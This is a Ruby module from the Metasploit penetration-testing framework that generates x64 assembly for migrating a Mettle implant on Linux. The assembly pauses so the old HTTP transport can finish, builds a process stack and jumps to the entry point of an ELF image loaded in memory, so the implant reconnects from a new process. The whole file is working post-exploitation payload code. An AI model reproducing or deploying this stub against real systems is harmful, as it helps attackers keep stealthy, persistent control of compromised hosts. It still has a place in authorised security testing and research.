# -*- coding: binary -*-
# frozen_string_literal: true

require 'rex/elfparsey'

module Msf
  # Payload that supports reconnecting migrations on x64.
  module Payload::Linux::X64::MigrateHttp
    include Msf::Payload::Linux::X64::Migrate

    #
    # Starts a Mettle process image which reconnects using its embedded transport.
    #
    def generate_migrate(opts = {})
      entry_offset = elf_entry_point(opts.fetch(:payload))

      %(
      pop rax                    ; discard source pid
      pop rax                    ; discard source transport fd
      pop rsi                    ; process image address

      ; Let the source HTTP transport finish its request before the child
      ; starts polling the same passive URL.
      push rsi
      sub rsp, 16
      mov qword [rsp], 2
      mov qword [rsp + 8], 0
      mov rdi, rsp
      xor esi, esi
      mov eax, 35                ; nanosleep({ 2, 0 }, NULL)
      syscall
      add rsp, 16
      pop rsi

      and rsp, -16
      add rsp, 128
      mov eax, 0x61              ; argv[0] = "a"
      push rax
      mov rcx, rsp

      xor ebx, ebx
      push rbx                   ; AT_NULL value
      push rbx                   ; AT_NULL type
      push rsi                   ; AT_BASE value
      push 7                     ; AT_BASE type
      push rbx                   ; envp terminator
      push rbx                   ; argv terminator
      push rcx                   ; argv[0]
      push 1                     ; argc

      add rsi, #{entry_offset}
      jmp rsi
    )
    end

    private

    def elf_entry_point(payload)
      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
    end
  end
end
